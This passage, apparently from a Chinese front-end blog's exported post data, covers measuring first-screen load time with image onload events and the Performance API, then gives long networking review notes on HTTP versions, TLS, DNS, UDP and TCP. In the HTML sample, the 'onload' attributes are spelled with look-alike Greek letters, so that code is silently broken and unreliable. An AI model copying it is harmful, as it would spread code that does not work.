统计首屏内加载最慢的图片/iframe 通常首屏内容中加载最慢的就是图片或者 iframe 资源，因此可以理解为当图片或者 iframe 都加载出来了，首屏肯定已经完成了。 由于浏览器对每个页面的 TCP 连接数有限制，使得并不是所有图片都能立刻开始下载和显示。我们只需要监听首屏内所有的图片的 onload 事件，获取图片 onload 时间最大值，并用这个最大值减去 navigationStart 即可获得近似的首屏时间。 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;首屏&lt;/title&gt; &lt;script&gt; // 不兼容 performance.timing 的浏览器 window.pageStartTime = Date.now() &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=\"https://lz5z.com/images/assets/img/google_atf.png\" alt=\"img\" οnlοad=\"load()\"&gt; &lt;img src=\"https://lz5z.com/images/assets/img/css3_gpu_speedup.png\" alt=\"img\" οnlοad=\"load()\"&gt; &lt;script&gt; function load () &#123; window.firstScreen = Date.now() &#125; window.onload = function () &#123; // 首屏时间 console.log(window.firstScreen - performance.timing.navigationStart) &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Performance APIPerformance 接口可以获取到当前页面与性能相关的信息。 (1) Performance.timing navigationStart: 表示从上一个文档卸载结束时的 unix 时间戳，如果没有上一个文档，这个值将和 fetchStart 相等。 unloadEventStart: 表示前一个网页（与当前页面同域）unload 的时间戳，如果无前一个网页 unload 或者前一个网页与当前页面不同域，则值为 0。 unloadEventEnd: 返回前一个页面 unload 时间绑定的回掉函数执行完毕的时间戳。 redirectStart: 第一个 HTTP 重定向发生时的时间。有跳转且是同域名内的重定向才算，否则值为 0。 redirectEnd: 最后一个 HTTP 重定向完成时的时间。有跳转且是同域名内部的重定向才算，否则值为 0。 fetchStart: 浏览器准备好使用 HTTP 请求抓取文档的时间，这发生在检查本地缓存之前。 domainLookupStart/domainLookupEnd: DNS 域名查询开始/结束的时间，如果使用了本地缓存（即无 DNS 查询）或持久连接，则与 fetchStart 值相等 connectStart: HTTP（TCP）开始/重新 建立连接的时间，如果是持久连接，则与 fetchStart 值相等。 connectEnd: HTTP（TCP） 完成建立连接的时间（完成握手），如果是持久连接，则与 fetchStart 值相等。 secureConnectionStart: HTTPS 连接开始的时间，如果不是安全连接，则值为 0。 requestStart: HTTP 请求读取真实文档开始的时间（完成建立连接），包括从本地读取缓存。 responseStart: HTTP 开始接收响应的时间（获取到第一个字节），包括从本地读取缓存。 responseEnd: HTTP 响应全部接收完成的时间（获取到最后一个字节），包括从本地读取缓存。 domLoading: 开始解析渲染 DOM 树的时间，此时 Document.readyState 变为 loading，并将抛出 readystatechange 相关事件。 domInteractive: 完成解析 DOM 树的时间，Document.readyState 变为 interactive，并将抛出 readystatechange 相关事件，注意只是 DOM 树解析完成，这时候并没有开始加载网页内的资源。 domContentLoadedEventStart: DOM 解析完成后，网页内资源加载开始的时间，在 DOMContentLoaded 事件抛出前发生。 domContentLoadedEventEnd: DOM 解析完成后，网页内资源加载完成的时间（如 JS 脚本加载执行完毕）。 domComplete: DOM 树解析完成，且资源也准备就绪的时间，Document.readyState 变为 complete，并将抛出 readystatechange 相关事件。 loadEventStart: load 事件发送给文档，也即 load 回调函数开始执行的时间。 loadEventEnd: load 事件的回调函数执行完毕的时间。 1234567891011121314151617181920212223242526// 计算加载时间function getPerformanceTiming() &#123; var t = performance.timing var times = &#123;&#125; // 页面加载完成的时间，用户等待页面可用的时间 times.loadPage = t.loadEventEnd - t.navigationStart // 解析 DOM 树结构的时间 times.domReady = t.domComplete - t.responseEnd // 重定向的时间 times.redirect = t.redirectEnd - t.redirectStart // DNS 查询时间 times.lookupDomain = t.domainLookupEnd - t.domainLookupStart // 读取页面第一个字节的时间 times.ttfb = t.responseStart - t.navigationStart // 资源请求加载完成的时间 times.request = t.responseEnd - t.requestStart // 执行 onload 回调函数的时间 times.loadEvent = t.loadEventEnd - t.loadEventStart // DNS 缓存时间 times.appcache = t.domainLookupStart - t.fetchStart // 卸载页面的时间 times.unloadEvent = t.unloadEventEnd - t.unloadEventStart // TCP 建立连接完成握手的时间 times.connect = t.connectEnd - t.connectStart return times&#125; (2) Performance.navigationredirectCount: 0 // 页面经过了多少次重定向 type: 00 表示正常进入页面；1 表示通过 window.location.reload() 刷新页面；2 表示通过浏览器前进后退进入页面；255 表示其它方式 (3) Performance.memoryjsHeapSizeLimit: 内存大小限制totalJSHeapSize: 可使用的内存usedJSHeapSize: JS 对象占用的内存","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"HTML、浏览器综合","slug":"技术/前端/HTML、浏览器综合","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/HTML%E3%80%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%BC%E5%90%88/"}],"tags":[]},{"title":"计算机网络复习汇总","slug":"计算机网络复习汇总","date":"2020-03-15T16:00:00.000Z","updated":"2024-05-25T02:28:45.283Z","comments":true,"path":"2020/03/16/计算机网络复习汇总/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0%E6%B1%87%E6%80%BB/","excerpt":"计算机网络知识总结","text":"计算机网络知识总结 本文搬运自CavsZhouyou的github本部分主要是笔者在复习 JavaScript 相关知识和一些相关面试题时所做的笔记，如果出现错误，希望大家指出！ 应用层应用层协议定义了应用进程间的交互和通信规则，不同主机的应用进程间如何相互传递报文，比如传递的报文的类型、格式、有哪些字段等等。 HTTP 协议概况HTTP 是超文本传输协议，它定义了客户端和服务器之间交换报文的格式和方式，默认使用 80 端口。它使用 TCP 作为传输层协议，保证了数据传输的可靠性。 HTTP 是一个无状态的协议，HTTP 服务器不会保存关于客户的任何信息。 HTTP 有两种连接模式，一种是持续连接，一种非持续连接。非持续连接指的是服务器必须为每一个请求的对象建立和维护一个全新的连接。持续连接下，TCP 连接默认不关闭，可以被多个请求复用。采用持续连接的好处是可以避免每次建立 TCP连接三次握手时所花费的时间。在 HTTP1.0 以前使用的非持续的连接，但是可以在请求时，加上 Connection: keep-alive 来要求服务器不要关闭 TCP 连接。HTTP1.1 以后默认采用的是持续的连接。目前对于同一个域，大多数浏览器支持同时建立 6 个持久连接。 HTTP 请求报文HTTP 报文有两种，一种是请求报文，一种是响应报文。 HTTP 请求报文的格式如下： 1234GET / HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5)Accept: */* HTTP 请求报文的第一行叫做请求行，后面的行叫做首部行，首部行后还可以跟一个实体主体。请求首部之后有一个空行，这个空行不能省略，它用来划分首部与实体。 请求行包含三个字段：方法字段、URL 字段和 HTTP 版本字段。 方法字段可以取几种不同的值，一般有 GET、POST、HEAD、PUT 和 DELETE。一般 GET 方法只被用于向服务器获取数据。POST 方法用于将实体提交到指定的资源，通常会造成服务器资源的修改。HEAD 方法与 GET 方法类似，但是在返回的响应中，不包含请求对象。PUT 方法用于上传文件到服务器，DELETE 方法用于删除服务器上的对象。虽然请求的方法很多，但更多表达的是一种语义上的区别，并不是说 POST 能做的事情，GET 就不能做了，主要看我们如何选择。更多的方法可以参看文档。 HTTP 响应报文HTTP 报文有两种，一种是请求报文，一种是响应报文。 HTTP 响应报文的格式如下：12345678910HTTP&#x2F;1.0 200 OK Content-Type: text&#x2F;plainContent-Length: 137582Expires: Thu, 05 Dec 1997 16:00:00 GMTLast-Modified: Wed, 5 August 1996 15:55:28 GMTServer: Apache 0.84&lt;html&gt; &lt;body&gt;Hello World&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; HTTP 响应报文的第一行叫做状态行，后面的行是首部行，最后是实体主体。 状态行包含了三个字段：协议版本字段、状态码和相应的状态信息。 实体部分是报文的主要部分，它包含了所请求的对象。 常见的状态有 200-请求成功、202-服务器端已经收到请求消息，但是尚未进行处理301-永久移动、302-临时移动、304-所请求的资源未修改、400-客户端请求的语法错误、404-请求的资源不存在500-服务器内部错误。 一般 1XX 代表服务器接收到请求、2XX 代表成功、3XX 代表重定向、4XX 代表客户端错误、5XX 代表服务器端错误。 更多关于状态码的可以查看： 《HTTP 状态码》 首部行首部可以分为四种首部，请求首部、响应首部、通用首部和实体首部。通用首部和实体首部在请求报文和响应报文中都可以设置，区别在于请求首部和响应首部。 常见的请求首部有 Accept 可接收媒体资源的类型、Accept-Charset 可接收的字符集、Host 请求的主机名。 常见的响应首部有 ETag 资源的匹配信息，Location 客户端重定向的 URI。 常见的通用首部有 Cache-Control 控制缓存策略、Connection 管理持久连接。 常见的实体首部有 Content-Length 实体主体的大小、Expires 实体主体的过期时间、Last-Modified 资源的最后修改时间。 更多关于首部的资料可以查看： 《HTTP 首部字段详细介绍》 《图解HTTP》 HTTP/1.1 协议缺点HTTP/1.1 默认使用了持久连接，多个请求可以复用同一个 TCP 连接，但是在同一个 TCP 连接里面，数据请求的通信次序是固定的。服务器只有处理完一个请求的响应后，才会进行下一个请求的处理，如果前面请求的响应特别慢的话，就会造成许多请求排队等待的情况，这种情况被称为“队头堵塞”。队头阻塞会导致持久连接在达到最大数量时，剩余的资源需要等待其他资源请求完成后才能发起请求。 为了避免这个问题，一个是减少请求数，一个是同时打开多个持久连接。这就是我们对网站优化时，使用雪碧图、合并脚本的原因。 HTTP/2 协议2009年，谷歌公开了自行研发的 SPDY 协议，主要解决 HTTP/1.1 效率不高的问题。这个协议在 Chrome 浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。2015年，HTTP/2 发布。 HTTP/2 主要有以下新的特性： 二进制协议HTTP/2 是一个二进制协议。在 HTTP/1.1 版中，报文的头信息必须是文本（ASCII编码），数据体可以是文本，也可以是二进制。HTTP/2 则是一个彻底的二进制协议，头信息和数据体都是二进制，并且统称为”帧”，可以分为头信息帧和数据帧。帧的概念是它实现多路复用的基础。 多路复用HTTP/2 实现了多路复用，HTTP/2 仍然复用 TCP 连接，但是在一个连接里，客户端和服务器都可以同时发送多个请求或回应，而且不用按照顺序一一发送，这样就避免了”队头堵塞”的问题。 数据流HTTP/2 使用了数据流的概念，因为 HTTP/2 的数据包是不按顺序发送的，同一个连接里面连续的数据包，可能属于不同的请求。因此，必须要对数据包做标记，指出它属于哪个请求。HTTP/2 将每个请求或回应的所有数据包，称为一个数据流。每个数据流都有一个独一无二的编号。数据包发送的时候，都必须标记数据流 ID ，用来区分它属于哪个数据流。 头信息压缩HTTP/2 实现了头信息压缩，由于 HTTP 1.1 协议不带有状态，每次请求都必须附上所有信息。所以，请求的很多字段都是重复的，比如 Cookie 和 User Agent ，一模一样的内容，每次请求都必须附带，这会浪费很多带宽，也影响速度。 HTTP/2 对这一点做了优化，引入了头信息压缩机制。一方面，头信息使用 gzip 或 compress 压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就能提高速度了。 服务器推送HTTP/2 允许服务器未经请求，主动向客户端发送资源，这叫做服务器推送。使用服务器推送，提前给客户端推送必要的资源，这样就可以相对减少一些延迟时间。这里需要注意的是 http2 下服务器主动推送的是静态资源，和 WebSocket 以及使用SSE 等方式向客户端发送即时数据的推送是不同的。 详细的资料可以参考：《HTTP 协议入门》《HTTP/2 服务器推送（Server Push）教程》 HTTP/2 协议缺点因为 HTTP/2 使用了多路复用，一般来说同一域名下只需要使用一个 TCP 连接。由于多个数据流使用同一个 TCP 连接，遵守同一个流量状态控制和拥塞控制。只要一个数据流遭遇到拥塞，剩下的数据流就没法发出去，这样就导致了后面的所有数据都会被阻塞。HTTP/2 出现的这个问题是由于其使用 TCP 协议的问题，与它本身的实现其实并没有多大关系。 HTTP/3 协议由于 TCP 本身存在的一些限制，Google 就开发了一个基于 UDP 协议的 QUIC 协议，并且使用在了 HTTP/3 上。 QUIC协议在 UDP 协议上实现了多路复用、有序交付、重传等等功能 详细资料可以参考：《如何看待 HTTP/3 ？》 HTTPS 协议HTTP 存在的问题 HTTP 报文使用明文方式发送，可能被第三方窃听。 HTTP 报文可能被第三方截取后修改通信内容，接收方没有办法发现报文内容的修改。 HTTP 还存在认证的问题，第三方可以冒充他人参与通信。 HTTPS 简介HTTPS 指的是超文本传输安全协议，HTTPS 是基于 HTTP 协议的，不过它会使用 TLS/SSL 来对数据加密。使用 TLS/SSL 协议，所有的信息都是加密的，第三方没有办法窃听。并且它提供了一种校验机制，信息一旦被篡改，通信的双方会立刻发现。它还配备了身份证书，防止身份被冒充的情况出现。 TLS 握手过程 第一步，客户端向服务器发起请求，请求中包含使用的协议版本号、生成的一个随机数、以及客户端支持的加密方法。 第二步，服务器端接收到请求后，确认双方使用的加密方法、并给出服务器的证书、以及一个服务器生成的随机数。 第三步，客户端确认服务器证书有效后，生成一个新的随机数，并使用数字证书中的公钥，加密这个随机数，然后发给服务器。并且还会提供一个前面所有内容的 hash 的值，用来供服务器检验。 第四步，服务器使用自己的私钥，来解密客户端发送过来的随机数。并提供前面所有内容的 hash 值来供客户端检验。 第五步，客户端和服务器端根据约定的加密方法使用前面的三个随机数，生成对话秘钥，以后的对话过程都使用这个秘钥来加密信息。 实现原理TLS 的握手过程主要用到了三个方法来保证传输的安全。 首先是对称加密的方法，对称加密的方法是，双方使用同一个秘钥对数据进行加密和解密。但是对称加密的存在一个问题，就是如何保证秘钥传输的安全性，因为秘钥还是会通过网络传输的，一旦秘钥被其他人获取到，那么整个加密过程就毫无作用了。这就要用到非对称加密的方法。 非对称加密的方法是，我们拥有两个秘钥，一个是公钥，一个是私钥。公钥是公开的，私钥是保密的。用私钥加密的数据，只有对应的公钥才能解密，用公钥加密的数据，只有对应的私钥才能解密。我们可以将公钥公布出去，任何想和我们通信的客户，都可以使用我们提供的公钥对数据进行加密，这样我们就可以使用私钥进行解密，这样就能保证数据的安全了。但是非对称加密有一个缺点就是加密的过程很慢，因此如果每次通信都使用非对称加密的方式的话，反而会造成等待时间过长的问题。 因此我们可以使用对称加密和非对称加密结合的方式，因为对称加密的方式的缺点是无法保证秘钥的安全传输，因此我们可以非对称加密的方式来对对称加密的秘钥进行传输，然后以后的通信使用对称加密的方式来加密，这样就解决了两个方法各自存在的问题。 但是现在的方法也不一定是安全的，因为我们没有办法确定我们得到的公钥就一定是安全的公钥。可能存在一个中间人，截取了对方发给我们的公钥，然后将他自己的公钥发送给我们，当我们使用他的公钥加密后发送的信息，就可以被他用自己的私钥解密。然后他伪装成我们以同样的方法向对方发送信息，这样我们的信息就被窃取了，然而我们自己还不知道。 为了解决这样的问题，我们可以使用数字证书的方式，首先我们使用一种 Hash 算法来对我们的公钥和其他信息进行加密生成一个信息摘要，然后让有公信力的认证中心（简称 CA ）用它的私钥对消息摘要加密，形成签名。最后将原始的信息和签名合在一起，称为数字证书。当接收方收到数字证书的时候，先根据原始信息使用同样的 Hash 算法生成一个摘要，然后使用公证处的公钥来对数字证书中的摘要进行解密，最后将解密的摘要和我们生成的摘要进行对比，就能发现我们得到的信息是否被更改了。这个方法最要的是认证中心的可靠性，一般浏览器里会内置一些顶层的认证中心的证书，相当于我们自动信任了他们，只有这样我们才能保证数据的安全。 详细资料可以参考：《一个故事讲完 https》《SSL/TLS 协议运行机制的概述》《图解 SSL/TLS 协议》《RSA 算法原理（一）》《RSA 算法原理（二）》《分分钟让你理解 HTTPS》 DNS 协议概况DNS 协议提供的是一种主机名到 IP 地址的转换服务，就是我们常说的域名系统。它是一个由分层的 DNS 服务器组成的分布式数据库，是定义了主机如何查询这个分布式数据库的方式的应用层协议。DNS 协议运行在 UDP 协议之上，使用 53 号端口。 域名的层级结构域名的层级结构可以如下 12345主机名.次级域名.顶级域名.根域名# 即host.sld.tld.root 根据域名的层级结构，管理不同层级域名的服务器，可以分为根域名服务器、顶级域名服务器和权威域名服务器。 查询过程DNS 的查询过程一般为，我们首先将 DNS 请求发送到本地 DNS 服务器，由本地 DNS 服务器来代为请求。 从”根域名服务器”查到”顶级域名服务器”的 NS 记录和 A 记录（ IP 地址）。 从”顶级域名服务器”查到”次级域名服务器”的 NS 记录和 A 记录（ IP 地址）。 从”次级域名服务器”查出”主机名”的 IP 地址。 比如我们如果想要查询 www.baidu.com 的 IP 地址，我们首先会将请求发送到本地的 DNS 服务器中，本地 DNS 服务器会判断是否存在该域名的缓存，如果不存在，则向根域名服务器发送一个请求，根域名服务器返回负责 .com 的顶级域名服务器的 IP 地址的列表。然后本地 DNS 服务器再向其中一个负责 .com 的顶级域名服务器发送一个请求，负责 .com的顶级域名服务器返回负责 .baidu 的权威域名服务器的 IP 地址列表。然后本地 DNS 服务器再向其中一个权威域名服务器发送一个请求，最后权威域名服务器返回一个对应的主机名的 IP 地址列表。 DNS 记录和报文DNS 服务器中以资源记录的形式存储信息，每一个 DNS 响应报文一般包含多条资源记录。一条资源记录的具体的格式为 （Name，Value，Type，TTL） 其中 TTL 是资源记录的生存时间，它定义了资源记录能够被其他的 DNS 服务器缓存多长时间。 常用的一共有四种 Type 的值，分别是 A、NS、CNAME 和 MX ，不同 Type 的值，对应资源记录代表的意义不同。 如果 Type = A，则 Name 是主机名，Value 是主机名对应的 IP 地址。因此一条记录为 A 的资源记录，提供了标准的主机名到 IP 地址的映射。 如果 Type = NS，则 Name 是个域名，Value 是负责该域名的 DNS 服务器的主机名。这个记录主要用于 DNS 链式查询时，返回下一级需要查询的 DNS 服务器的信息。 如果 Type = CNAME，则 Name 为别名，Value 为该主机的规范主机名。该条记录用于向查询的主机返回一个主机名对应的规范主机名，从而告诉查询主机去查询这个主机名的 IP 地址。主机别名主要是为了通过给一些复杂的主机名提供一个便于记忆的简单的别名。 如果 Type = MX，则 Name 为一个邮件服务器的别名，Value 为邮件服务器的规范主机名。它的作用和 CNAME 是一样的，都是为了解决规范主机名不利于记忆的缺点。 递归查询和迭代查询递归查询指的是查询请求发出后，域名服务器代为向下一级域名服务器发出请求，最后向用户返回查询的最终结果。使用递归查询，用户只需要发出一次查询请求。 迭代查询指的是查询请求后，域名服务器返回单次查询的结果。下一级的查询由用户自己请求。使用迭代查询，用户需要发出多次的查询请求。 一般我们向本地 DNS 服务器发送请求的方式就是递归查询，因为我们只需要发出一次请求，然后本地 DNS 服务器返回给我们最终的请求结果。而本地 DNS 服务器向其他域名服务器请求的过程是迭代查询的过程，因为每一次域名服务器只返回单次查询的结果，下一级的查询由本地 DNS 服务器自己进行。 DNS 缓存DNS 缓存的原理非常简单，在一个请求链中，当某个 DNS 服务器接收到一个 DNS 回答后，它能够将回答中的信息缓存在本地存储器中。返回的资源记录中的 TTL 代表了该条记录的缓存的时间。 DNS 实现负载平衡DNS 可以用于在冗余的服务器上实现负载平衡。因为现在一般的大型网站使用多台服务器提供服务，因此一个域名可能会对应多个服务器地址。当用户发起网站域名的 DNS 请求的时候，DNS 服务器返回这个域名所对应的服务器 IP 地址的集合，但在每个回答中，会循环这些 IP 地址的顺序，用户一般会选择排在前面的地址发送请求。以此将用户的请求均衡的分配到各个不同的服务器上，这样来实现负载均衡。 详细资料可以参考：《DNS 原理入门》《根域名的知识》 传输层传输层协议主要是为不同主机上的不同进程间提供了逻辑通信的功能。传输层只工作在端系统中。 多路复用与多路分解将传输层报文段中的数据交付到正确的套接字的工作被称为多路分解。 在源主机上从不同的套接字中收集数据，封装头信息生成报文段后，将报文段传递到网络层，这个过程被称为多路复用。 无连接的多路复用和多路分解指的是 UDP 套接字的分配过程，一个 UDP 套接字由一个二元组来标识，这个二元组包含了一个目的地址和一个目的端口号。因此不同源地址和端口号的 UDP 报文段到达主机后，如果它们拥有相同的目的地址和目的端口号，那么不同的报文段将会转交到同一个 UDP 套接字中。 面向连接的多路复用和多路分解指的是 TCP 套接字的分配过程，一个 TCP 套接字由一个四元组来标识，这个四元组包含了源 IP 地址、源端口号、目的地址和目的端口号。因此，一个 TCP 报文段从网络中到达一台主机上时，该主机使用全部4个值来将报文段定向到相应的套接字。 UDP 协议UDP 是一种无连接的，不可靠的传输层协议。它只提供了传输层需要实现的最低限度的功能，除了复用/分解功能和少量的差错检测外，它几乎没有对 IP 增加其他的东西。UDP 协议适用于对实时性要求高的应用场景。 特点： 使用 UDP 时，在发送报文段之前，通信双方没有握手的过程，因此 UDP 被称为是无连接的传输层协议。因为没有握手过程，相对于 TCP 来说，没有建立连接的时延。因为没有连接，所以不需要在端系统中保存连接的状态。 UDP 提供尽力而为的交付服务，也就是说 UDP 协议不保证数据的可靠交付。 UDP 没有拥塞控制和流量控制的机制，所以 UDP 报文段的发送速率没有限制。 因为一个 UDP 套接字只使用目的地址和目的端口来标识，所以 UDP 可以支持一对一、一对多、多对一和多对多的交互通信。 UDP 首部小，只有8个字节。 UDP 报文段结构UDP 报文段由首部和应用数据组成。报文段首部包含四个字段，分别是源端口号、目的端口号、长度和检验和，每个字段的长度为两个字节。长度字段指的是整个报文段的长度，包含了首部和应用数据的大小。校验和是 UDP 提供的一种差错校验机制。虽然提供了差错校验的机制，但是 UDP 对于差错的恢复无能为力。 TCP 协议TCP 协议是面向连接的，提供可靠数据传输服务的传输层协议。 特点： TCP 协议是面向连接的，在通信双方进行通信前，需要通过三次握手建立连接。它需要在端系统中维护双方连接的状态信息。 TCP 协议通过序号、确认号、定时重传、检验和等机制，来提供可靠的数据传输服务。 TCP 协议提供的是点对点的服务，即它是在单个发送方和单个接收方之间的连接。 TCP 协议提供的是全双工的服务，也就是说连接的双方的能够向对方发送和接收数据。 TCP 提供了拥塞控制机制，在网络拥塞的时候会控制发送数据的速率，有助于减少数据包的丢失和减轻网络中的拥塞程度。 TCP 提供了流量控制机制，保证了通信双方的发送和接收速率相同。如果接收方可接收的缓存很小时，发送方会降低发送速率，避免因为缓存填满而造成的数据包的丢失。 TCP 报文段结构TCP 报文段由首部和数据组成，它的首部一般为 20 个字节。 源端口和目的端口号用于报文段的多路复用和分解。 32比特的序号和32比特的确认号，用与实现可靠数据运输服务。 16比特的接收窗口字段用于实现流量控制，该字段表示接收方愿意接收的字节的数量。 4比特的首部长度字段，该字段指示了以32比特的字为单位的 TCP 首部的长度。 6比特的标志字段，ACK 字段用于指示确认序号的值是有效的，RST、SYN 和 FIN 比特用于连接建立和拆除。设置 PSH 字段指示接收方应该立即将数据交给上层，URG 字段用来指示报文段里存在紧急的数据。 校验和提供了对数据的差错检测。 TCP 三次握手的过程第一次握手，客户端向服务器发送一个 SYN 连接请求报文段，报文段的首部中 SYN 标志位置为1，序号字段是一个任选的随机数。它代表的是客户端数据的初始序号。 第二次握手，服务器端接收到客户端发送的 SYN 连接请求报文段后，服务器首先会为该连接分配 TCP 缓存和变量，然后向客户端发送 SYN ACK 报文段，报文段的首部中 SYN 和 ACK 标志位都被置为1，代表这是一个对 SYN 连接请求的确认，同时序号字段是服务器端产生的一个任选的随机数，它代表的是服务器端数据的初始序号。确认号字段为客户端发送的序号加一。 第三次握手，客户端接收到服务器的肯定应答后，它也会为这次 TCP 连接分配缓存和变量，同时向服务器端发送一个对服务器端的报文段的确认。第三次握手可以在报文段中携带数据。 在我看来，TCP 三次握手的建立连接的过程就是相互确认初始序号的过程，告诉对方，什么样序号的报文段能够被正确接收。第三次握手的作用是客户端对服务器端的初始序号的确认。如果只使用两次握手，那么服务器就没有办法知道自己的序号是否已被确认。同时这样也是为了防止失效的请求报文段被服务器接收，而出现错误的情况。 详细资料可以参考：《TCP 为什么是三次握手，而不是两次或四次？》《TCP 的三次握手与四次挥手》 TCP 四次挥手的过程因为 TCP 连接是全双工的，也就是说通信的双方都可以向对方发送和接收消息，所以断开连接需要双方的确认。 第一次挥手，客户端认为没有数据要再发送给服务器端，它就向服务器发送一个 FIN 报文段，申请断开客户端到服务器端的连接。发送后客户端进入 FIN_WAIT_1 状态。 第二次挥手，服务器端接收到客户端释放连接的请求后，向客户端发送一个确认报文段，表示已经接收到了客户端释放连接的请求，以后不再接收客户端发送过来的数据。但是因为连接是全双工的，所以此时，服务器端还可以向客户端发送数据。服务器端进入 CLOSE_WAIT 状态。客户端收到确认后，进入 FIN_WAIT_2 状态。 第三次挥手，服务器端发送完所有数据后，向客户端发送 FIN 报文段，申请断开服务器端到客户端的连接。发送后进入 LAST_ACK 状态。 第四次挥手，客户端接收到 FIN 请求后，向服务器端发送一个确认应答，并进入 TIME_WAIT 阶段。该阶段会持续一段时间，这个时间为报文段在网络中的最大生存时间，如果该时间内服务端没有重发请求的话，客户端进入 CLOSED 的状态。如果收到服务器的重发请求就重新发送确认报文段。服务器端收到客户端的确认报文段后就进入 CLOSED 状态，这样全双工的连接就被释放了。 TCP 使用四次挥手的原因是因为 TCP 的连接是全双工的，所以需要双方分别释放到对方的连接，单独一方的连接释放，只代表不能再向对方发送数据，连接处于的是半释放的状态。 最后一次挥手中，客户端会等待一段时间再关闭的原因，是为了防止发送给服务器的确认报文段丢失或者出错，从而导致服务器端不能正常关闭。 详细资料可以参考： 《前端面试之道》 状态转化图 ARQ 协议ARQ 协议指的是自动重传请求，它通过超时和重传来保证数据的可靠交付，它是 TCP 协议实现可靠数据传输的一个很重要的机制。 它分为停止等待 ARQ 协议和连续 ARQ 协议。 一、停止等待 ARQ 协议 停止等待 ARQ 协议的基本原理是，对于发送方来说发送方每发送一个分组，就为这个分组设置一个定时器。当发送分组的确认回答返回了，则清除定时器，发送下一个分组。如果在规定的时间内没有收到已发送分组的肯定回答，则重新发送上一个分组。 对于接受方来说，每次接受到一个分组，就返回对这个分组的肯定应答，当收到冗余的分组时，就直接丢弃，并返回一个对冗余分组的确认。当收到分组损坏的情况的时候，直接丢弃。 使用停止等待 ARQ 协议的缺点是每次发送分组必须等到分组确认后才能发送下一个分组，这样会造成信道的利用率过低。 二、连续 ARQ 协议 连续 ARQ 协议是为了解决停止等待 ARQ 协议对于信道的利用率过低的问题。它通过连续发送一组分组，然后再等待对分组的确认回答，对于如何处理分组中可能出现的差错恢复情况，一般可以使用滑动窗口协议和选择重传协议来实现。 滑动窗口协议 使用滑动窗口协议，在发送方维持了一个发送窗口，发送窗口以前的分组是已经发送并确认了的分组，发送窗口中包含了已经发送但未确认的分组和允许发送但还未发送的分组，发送窗口以后的分组是缓存中还不允许发送的分组。当发送方向接收方发送分组时，会依次发送窗口内的所有分组，并且设置一个定时器，这个定时器可以理解为是最早发送但未收到确认的分组。如果在定时器的时间内收到某一个分组的确认回答，则滑动窗口，将窗口的首部移动到确认分组的后一个位置，此时如果还有已发送但没有确认的分组，则重新设置定时器，如果没有了则关闭定时器。如果定时器超时，则重新发送所有已经发送但还未收到确认的分组。 接收方使用的是累计确认的机制，对于所有按序到达的分组，接收方返回一个分组的肯定回答。如果收到了一个乱序的分组，那么接方会直接丢弃，并返回一个最近的按序到达的分组的肯定回答。使用累计确认保证了确认号以前的分组都已经按序到达了，所以发送窗口可以移动到已确认分组的后面。 滑动窗口协议的缺点是因为使用了累计确认的机制，如果出现了只是窗口中的第一个分组丢失，而后面的分组都按序到达的情况的话，那么滑动窗口协议会重新发送所有的分组，这样就造成了大量不必要分组的丢弃和重传。 选择重传协议 因为滑动窗口使用累计确认的方式，所以会造成很多不必要分组的重传。使用选择重传协议可以解决这个问题。 选择重传协议在发送方维护了一个发送窗口。发送窗口的以前是已经发送并确认的分组，窗口内包含了已发送但未被确认的分组，已确认的乱序分组，和允许发送但还未发送的分组，发送窗口以后的是缓存中还不允许发送的分组。选择重传协议与滑动窗口协议最大的不同是，发送方发送分组时，为一个分组都创建了一个定时器。当发送方接受到一个分组的确认应答后，取消该分组的定时器，并判断接受该分组后，是否存在由窗口首部为首的连续的确认分组，如果有则向后移动窗口的位置，如果没有则将该分组标识为已接收的乱序分组。当某一个分组定时器到时后，则重新传递这个分组。 在接收方，它会确认每一个正确接收的分组，不管这个分组是按序的还是乱序的，乱序的分组将被缓存下来，直到所有的乱序分组都到达形成一个有序序列后，再将这一段分组交付给上层。对于不能被正确接收的分组，接收方直接忽略该分组。 详细资料可以参考：《TCP 连续 ARQ 协议和滑动窗口协议》 TCP 的可靠运输机制TCP 的可靠运输机制是基于连续 ARQ 协议和滑动窗口协议的。 TCP 协议在发送方维持了一个发送窗口，发送窗口以前的报文段是已经发送并确认了的报文段，发送窗口中包含了已经发送但未确认的报文段和允许发送但还未发送的报文段，发送窗口以后的报文段是缓存中还不允许发送的报文段。当发送方向接收方发送报文时，会依次发送窗口内的所有报文段，并且设置一个定时器，这个定时器可以理解为是最早发送但未收到确认的报文段。如果在定时器的时间内收到某一个报文段的确认回答，则滑动窗口，将窗口的首部向后滑动到确认报文段的后一个位置，此时如果还有已发送但没有确认的报文段，则重新设置定时器，如果没有了则关闭定时器。如果定时器超时，则重新发送所有已经发送但还未收到确认的报文段，并将超时的间隔设置为以前的两倍。当发送方收到接收方的三个冗余的确认应答后，这是一种指示，说明该报文段以后的报文段很有可能发生丢失了，那么发送方会启用快速重传的机制，就是当前定时器结束前，发送所有的已发送但确认的报文段。 接收方使用的是累计确认的机制，对于所有按序到达的报文段，接收方返回一个报文段的肯定回答。如果收到了一个乱序的报文段，那么接方会直接丢弃，并返回一个最近的按序到达的报文段的肯定回答。使用累计确认保证了返回的确认号之前的报文段都已经按序到达了，所以发送窗口可以移动到已确认报文段的后面。 发送窗口的大小是变化的，它是由接收窗口剩余大小和网络中拥塞程度来决定的，TCP 就是通过控制发送窗口的长度来控制报文段的发送速率。 但是 TCP 协议并不完全和滑动窗口协议相同，因为许多的 TCP 